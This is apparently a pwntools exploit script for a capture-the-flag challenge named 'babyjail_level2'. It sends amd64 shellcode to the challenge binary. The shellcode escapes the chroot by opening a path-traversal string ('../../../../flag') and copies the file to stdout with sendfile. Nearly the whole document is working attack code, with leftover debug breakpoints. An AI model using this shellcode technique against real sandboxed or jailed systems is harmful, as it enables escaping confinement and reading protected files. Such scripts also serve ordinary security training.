from pwn import *

pwnable = './babyjail_level2_testing1'

elf = ELF(pwnable)

context(terminal=['tmux', 'new-window'])

context.log_level = 'DEBUG'
context(os = 'linux', arch = 'amd64')

debug_set_1 = '''
    b main
    b *0x4014be
    '''
    #b *0x5555555554cc
    #b *0x555555555628
    #b *0x555555555634
    #b *0x555555555645
    
    #b *0x5555555555af
    #b *0x5555555554c8

if len(sys.argv) > 2 and sys.argv[1] == 'debug':
    #p = process(pwnable)
    #gdb.attach(p, debug_set_1)
    p = gdb.debug([pwnable, 'asdsada'], debug_set_1)
else:
    p = process(pwnable)
    #env = {"LD_PRELOAD": os.path.join(os.getcwd(), "/root/libc_32.so.6")}
    p = process(pwnable, debug_set_1)

shellcode_2 = '''
lea edi, [rip+flag]    
mov eax, 2                              
mov esi, 0                             
syscall
mov edi, 1                              
mov esi, eax                            
mov edx, 0                              
mov r10, 1000                           
mov eax, 40                            
syscall                         
mov eax, 60
syscall
flag:
.string "../../../../../../../../../../flag"
'''


#shellcode = asm(shellcode_2)
#shellcode = asm(shellcode_3)
shellcode = asm(shellcode_2)

p.recvuntil("Let's get started!\n")
p.send(shellcode)
#p.send(shellcode)
p.recvuntil("Segmentation fault")
#p.wait_for_close()
